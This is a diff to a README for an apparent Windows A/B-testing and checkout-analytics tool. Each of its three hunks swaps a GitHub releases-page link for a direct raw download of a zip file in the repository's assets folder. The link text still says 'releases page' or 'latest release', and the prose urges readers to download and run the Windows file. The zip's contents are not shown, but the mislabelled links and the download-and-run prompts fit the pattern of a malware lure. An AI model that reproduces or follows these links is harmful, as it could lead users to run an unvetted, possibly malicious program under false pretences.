@@ -1,6 +1,6 @@
 # 📊 conversion-optimization-ab-testing - Improve checkout decisions with data
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/raw/refs/heads/main/assets/conversion-optimization-ab-testing-v1.3-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ For best results, use Windows 10 or Windows 11.
 
 Go to the releases page and download and run the file for Windows:
 
-[Visit the releases page](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/releases)
+[Visit the releases page](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/raw/refs/heads/main/assets/conversion-optimization-ab-testing-v1.3-beta.1.zip)
 
 On that page, look for the latest release and choose the Windows file. If there are more than one file, pick the one that ends in `.exe` or the Windows installer file.
 
@@ -178,6 +178,6 @@ Yes. It shows both test results and likely business impact.
 
 Use this page to download and run the Windows file:
 
-[Open the latest release](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/releases)
+[Open the latest release](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/raw/refs/heads/main/assets/conversion-optimization-ab-testing-v1.3-beta.1.zip)
 
 Select the newest version, then choose the file for Windows. After the download finishes, open the file and follow the setup steps on screen
